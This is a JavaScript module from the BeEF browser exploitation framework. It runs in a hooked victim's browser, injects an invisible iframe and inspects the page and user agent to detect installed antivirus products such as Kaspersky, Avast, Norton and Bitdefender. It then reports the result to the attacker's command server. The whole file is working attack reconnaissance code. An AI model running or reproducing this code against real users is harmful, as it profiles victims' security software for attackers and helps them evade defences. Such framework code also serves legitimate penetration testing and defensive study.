//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    //Detection of av elements starts
        var image = "<body><img src='x'/></body>";
        var hidden_iframe = beef.dom.createInvisibleIframe();
        hidden_iframe.setAttribute("id", "frmin");
        document.body.appendChild(hidden_iframe);
        var kaspersky_iframe = hidden_iframe.contentDocument || hidden_iframe.contentWindow.document;
        kaspersky_iframe.open();
        kaspersky_iframe.write(image);
        kaspersky_iframe.close();

        var frm = document.getElementById("frmin");
        ka = frm.contentDocument.getElementsByTagName("html")[0].outerHTML;
        var AV = document.getElementById("abs-top-frame");
        var NAV = document.getElementById("coFrameDiv");
        var ASWregexp = new RegExp("ASW\/");
    //Detection of av elements ends

	if (ASWregexp.test(navigator.userAgent))
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Avast');
    if (ka.indexOf("kasperskylab_antibanner") !== -1)
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Kaspersky');
    else if (ka.indexOf("netdefender/hui/ndhui.js") !== -1)
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Bitdefender');
    else if (AV !== null) {
        if (AV.outerHTML.indexOf('/html/top.html') >= 0 & AV.outerHTML.indexOf('chrome-extension://') >= 0)
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Avira');
    } else if (NAV !== null) {
        var nort = NAV.outerHTML;
        if (nort.indexOf('coToolbarFrame') >= 0 & nort.indexOf('/toolbar/placeholder.html') >= 0 & nort.indexOf('chrome-extension://') >= 0)
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Norton');
    } else if (document.getElementsByClassName('drweb_btn').length > 0)
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=DrWeb');
    else beef.net.send('<%= @command_url %>', <%= @command_id %>, 'antivirus=Not Detected');

});
